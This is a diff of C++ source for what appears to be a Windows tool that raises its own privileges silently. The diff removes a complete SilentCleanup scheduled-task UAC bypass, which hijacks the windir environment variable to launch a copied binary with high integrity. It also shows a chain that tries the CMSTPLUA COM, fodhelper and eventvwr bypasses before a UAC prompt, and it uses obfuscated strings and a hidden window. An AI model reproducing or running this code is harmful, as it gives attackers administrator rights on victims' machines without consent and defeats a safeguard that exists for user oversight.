@@ -191,71 +191,12 @@ static bool ElevateEventvwr(const char* me) {
 	return true;
 }
 
-// ── SilentCleanup scheduled task hijack ──────────────────────────────────────
-// \Microsoft\Windows\DiskCleanup\SilentCleanup runs as the current user with
-// HIGHEST_AVAILABLE privilege — no UAC prompt, no prompt of any kind.
-// It launches %windir%\system32\cleanmgr.exe.
-// Setting HKCU\Environment\windir overrides %windir% for this task only.
-// We temporarily point windir to a dir containing our rename of cleanmgr.exe,
-// trigger the task, wait, then restore.
-// Detection: HKCU\Environment\windir write + schtasks /Run on SilentCleanup.
-
-static bool ElevateSilentCleanup(const char* me) {
-	char tmpPath[MAX_PATH] = {};
-	GetTempPathA(MAX_PATH, tmpPath);
-	std::string fakeWindir = std::string(tmpPath) + S("scenv");
-	std::string fakeSystem32 = fakeWindir + S("\\system32");
-
-	// Create %temp%\scenv\system32\ directory
-	CreateDirectoryA(fakeWindir.c_str(), NULL);
-	CreateDirectoryA(fakeSystem32.c_str(), NULL);
-
-	// Copy this exe as cleanmgr.exe in the fake system32
-	std::string cleanmgr = fakeSystem32 + S("\\cleanmgr.exe");
-	if (!CopyFileA(me, cleanmgr.c_str(), FALSE)) {
-		RemoveDirectoryA(fakeSystem32.c_str());
-		RemoveDirectoryA(fakeWindir.c_str());
-		return false;
-	}
-
-	// Set HKCU\Environment\windir to the fake directory
-	HKEY hk = NULL;
-	const char* envKey = S("Environment").c_str();
-	RegOpenKeyExA(HKEY_CURRENT_USER, envKey, 0, KEY_SET_VALUE, &hk);
-	if (!hk) {
-		DeleteFileA(cleanmgr.c_str());
-		RemoveDirectoryA(fakeSystem32.c_str());
-		RemoveDirectoryA(fakeWindir.c_str());
-		return false;
-	}
-	RegSetValueExA(hk, S("windir").c_str(), 0, REG_SZ,
-	               (LPBYTE)fakeWindir.c_str(), (DWORD)fakeWindir.size()+1);
-	RegCloseKey(hk);
-
-	// Trigger SilentCleanup task — runs cleanmgr.exe (our exe) with highest privilege
-	char windir[MAX_PATH] = {};
-	GetWindowsDirectoryA(windir, sizeof(windir)-1);
-	std::string schtasks = std::string(windir) + S("\\System32\\schtasks.exe");
-	std::string args = S("/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I");
-	ShellExecuteA(NULL, S("open").c_str(), schtasks.c_str(), args.c_str(), NULL, SW_HIDE);
-	Sleep(3000);
-
-	// Restore: delete HKCU\Environment\windir, clean up temp files
-	RegOpenKeyExA(HKEY_CURRENT_USER, envKey, 0, KEY_SET_VALUE, &hk);
-	if (hk) { RegDeleteValueA(hk, S("windir").c_str()); RegCloseKey(hk); }
-	DeleteFileA(cleanmgr.c_str());
-	RemoveDirectoryA(fakeSystem32.c_str());
-	RemoveDirectoryA(fakeWindir.c_str());
-	return true;
-}
-
 // ── Master silent elevation ───────────────────────────────────────────────────
-// Tries four escalation methods silently before falling back to the UAC dialog.
+// Tries three escalation methods silently before falling back to the UAC dialog.
 // Method 1 (CMSTPLUA COM): works at all UAC levels except "Always notify".
-// Method 2 (SilentCleanup task): works at all non-"Always notify" UAC levels.
-// Method 3 (fodhelper): works when UAC is Default or lower.
-// Method 4 (eventvwr): backup for when fodhelper is blocked.
-// Method 5 (runas): last resort — shows the standard UAC elevation dialog.
+// Method 2 (fodhelper): works when UAC is Default or lower.
+// Method 3 (eventvwr): backup for when fodhelper is blocked.
+// Method 4 (runas): last resort — shows the standard UAC elevation dialog.
 // If any method succeeds, the new elevated process runs this binary again and
 // this unelevated instance exits immediately.
 
@@ -263,15 +204,12 @@ static void SilentAutoElevate(const char* me, const char* args) {
 	// Method 1: CMSTPLUA COM (completely silent)
 	if (ElevateCmstplua(me, args)) return;
 	Sleep(200);
-	// Method 2: SilentCleanup scheduled task (completely silent)
-	if (ElevateSilentCleanup(me)) return;
-	Sleep(200);
-	// Method 3: fodhelper (silent at default UAC)
+	// Method 2: fodhelper (silent at default UAC)
 	if (ElevateFodhelper(me)) return;
 	Sleep(200);
-	// Method 4: eventvwr (silent at default UAC)
+	// Method 3: eventvwr (silent at default UAC)
 	if (ElevateEventvwr(me)) return;
-	// Method 5: UAC dialog (last resort — shows one popup)
+	// Method 4: UAC dialog (last resort — shows one popup)
 	SHELLEXECUTEINFOA sei = {};
 	sei.cbSize       = sizeof(sei);
 	sei.lpVerb       = S("runas").c_str();
